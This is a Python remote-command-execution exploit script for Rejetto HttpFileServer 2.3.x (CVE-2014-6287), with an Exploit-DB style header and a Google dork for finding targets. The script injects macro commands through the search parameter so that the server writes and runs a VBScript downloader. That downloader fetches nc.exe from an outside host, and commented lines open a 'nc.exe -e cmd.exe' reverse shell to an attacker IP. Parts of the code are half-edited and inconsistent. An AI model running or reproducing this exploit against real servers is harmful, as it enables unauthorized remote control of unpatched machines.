#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
 
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!


import urllib2
from urllib import quote_plus
import sys

def fetchFile(src, name):
        # script that fetches the file
        vbs = "C:\Users\Public\\" + name + ".vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22MSXML2.ServerXMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22" + quote_plus(src) + "%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5C" + name + "%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
        do("save|" + vbs)
        do("exec|cscript.exe%20C%3A%5CUsers%5CPublic%5C" + name + ".vbs")

def do(smth):
        urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+smth+".}")

def script_create():
        urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

def execute_script():
        urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

def nc_run():
        urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

# ip_addr = "10.10.14.131" #local IP address
# host = "andinfinity.de%2Fshow"
# local_port = "4454" # Local Port number

fetchFile("http://andinfinity.de/show/nc.exe", "nc2.exe")
do("exec|nc2.exe.vbs")
# fetchFile("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1", "pc.ps1")

# vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22MSXML2.ServerXMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+host+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
# check = "C:\Users\Public\check.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22MSXML2.ServerXMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2Fgithub.com%2Fpentestmonkey%2Fwindows-privesc-check%2Fblob%2Fmaster%2Fwindows-privesc-check2.exe%3Fraw%3Dtrue%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Ccheck.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
# save = "save|" + vbs
# vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
# exe= "exec|"+vbs2
# # vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20PowerShell.exe%20"+ip_addr+"%20"+local_port
# vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
# exe1 = "exec|"+vbs3
# script_create()
# execute_script()
# nc_run()
#
# do("exec|C%3A%5CUsers%5CPublic%5Cbackup.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port)